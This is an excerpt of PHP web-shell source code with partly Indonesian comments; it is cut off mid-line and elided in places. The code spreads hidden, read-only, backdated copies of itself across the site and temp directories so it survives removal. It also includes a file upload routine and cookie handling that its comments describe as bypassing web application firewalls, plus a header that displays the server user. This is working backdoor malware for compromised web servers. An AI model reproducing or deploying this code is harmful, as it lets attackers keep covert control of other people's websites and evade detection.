...
// Sebar backup tersembunyi
$hidden_copies = array(
    dirname($self) . '/.cache/.' . md5($self) . '.tmp',
    sys_get_temp_dir() . '/.' . md5($_SERVER['HTTP_HOST']) . '.tmp',
    dirname($self) . '/.' . md5($self) . '.bak',
);
foreach ($hidden_copies as $hc) {
    $hc_dir = dirname($hc);
    if (!file_exists($hc_dir)) @mkdir($hc_dir, 0755, true);
    if (!file_exists($hc) || filesize($hc) < 100) {
        @copy($self, $hc);
        @chmod($hc, 0444);
        @touch($hc, strtotime('-60 days'));
    }
}

// Anti-WAF Headers & Config
...
// Anti-WAF: Randomize output sedikit
if (!isset($_COOKIE['_m4ul_tkn'])) {
    $token = md5(uniqid(mt_rand(), true));
    @setcookie('_m4ul_tkn', $token, time() + 86400, '/');
}
...
// Upload with WAF bypass
if (isset($_FILES['f'])) {
    $t = $_FILES['f']['tmp_name']; $n = $_FILES['f']['name'];
    // Coba multiple method bypass
    ...
    elseif (@rename($t, $pwd.'/'.$n)) $msg = 'OK: '.$n;
    else {
        // Bypass WAF: Upload via stream
        $in = @fopen($t, 'r');
        $out = @fopen($pwd.'/'.$n, 'w');
        if ($in && $out) {
...
<div class="header">
    ...
    <div class="hinfo">
        ...
        <div class="hcell"><span class="hk">User:</span> <span class="hv"><?php echo @get_current_user() ?: getm
